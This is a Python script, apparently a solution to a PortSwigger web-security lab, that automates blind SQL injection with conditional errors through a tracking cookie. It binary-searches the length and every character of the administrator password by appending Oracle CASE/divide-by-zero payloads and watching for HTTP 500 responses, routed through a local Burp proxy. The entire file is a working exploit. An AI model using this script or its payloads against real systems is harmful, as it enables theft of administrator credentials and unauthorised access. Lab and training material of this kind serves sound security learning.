# from portswigger_solutions.config import *
import requests
import argparse
import urllib
import urllib3
import copy

BURP_PROXY_IP = "127.0.0.1"
BURP_PROXY_PORT = "8080"
BURP_PROXIES = {
    "http": f"http://{BURP_PROXY_IP}:{BURP_PROXY_PORT}",
    "https": f"http://{BURP_PROXY_IP}:{BURP_PROXY_PORT}",
}

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def guess_char(
    url: str, idx: int, ascii_left_bound: int, ascii_right_bound: int, cookies: dict
) -> int:
    guess = (ascii_left_bound + ascii_right_bound) // 2

    sqli_template = "' AND (SELECT CASE WHEN ASCII(SUBSTR(password, {0}, 1)) {1} '{2}' THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') = 'a'-- "

    payload = sqli_template.format(idx, "=", guess)

    payload_encoded = urllib.parse.quote(payload)

    modifed_cookies = copy.deepcopy(cookies)
    modifed_cookies["TrackingId"] += payload_encoded

    r = requests.get(url, cookies=modifed_cookies, verify=False, proxies=BURP_PROXIES)
    
    if r.status_code == 500:
        return guess
    else:
        payload = sqli_template.format(idx, ">", guess)
        payload_encoded = urllib.parse.quote(payload)

        modifed_cookies = copy.deepcopy(cookies)
        modifed_cookies["TrackingId"] += payload_encoded

        r = requests.get(
            url, cookies=modifed_cookies, verify=False, proxies=BURP_PROXIES
        )

        if r.status_code == 500:
            return guess_char(url, idx, guess, ascii_right_bound, cookies)
        else:
            return guess_char(url, idx, ascii_left_bound, guess, cookies)


def guess_password_length(
    url: str, min_length: int, max_length: int, cookies: dict
) -> int:

    guess = (min_length + max_length) // 2
    
    sqli_template = "' AND (SELECT CASE WHEN LENGTH(password) {0} {1} THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') = 'a'-- "

    payload = sqli_template.format("=", guess)
    payload_encoded = urllib.parse.quote(payload)

    modifed_cookies = copy.deepcopy(cookies)
    modifed_cookies["TrackingId"] += payload_encoded

    r = requests.get(url, cookies=modifed_cookies, verify=False, proxies=BURP_PROXIES)
    
    if r.status_code == 500:
        return guess
    else:
        payload = sqli_template.format(">", guess)
        payload_encoded = urllib.parse.quote(payload)

        modifed_cookies = copy.deepcopy(cookies)
        modifed_cookies["TrackingId"] += payload_encoded

        r = requests.get(
            url, cookies=modifed_cookies, verify=False, proxies=BURP_PROXIES
        )

        if r.status_code == 500:
            return guess_password_length(url, guess, max_length, cookies)
        else:
            return guess_password_length(url, min_length, guess, cookies)


if __name__ == "__main__":

    cookies = {
        "TrackingId": "y4GZs7nbQ43qFBkY",
        "session": "5w3PAsmrEoQFEoCvtVU3VMsmmUJNLMMj",
    }

    parser = argparse.ArgumentParser(
        description="Brute force password length and value"
    )
    parser.add_argument("-u", "--url", help="URL of the target")
    args = parser.parse_args()

    print("Guessing a password length between 1-30.........")
    password_length = guess_password_length(args.url, 1, 30, cookies)
    print("Found password length: ", password_length)

    print("Guessing the password value.........")
    password = ""
    for i in range(1, password_length + 1):
        char = guess_char(args.url, i, 32, 126, cookies)
        password += chr(char)
    print("Password found: ", password)
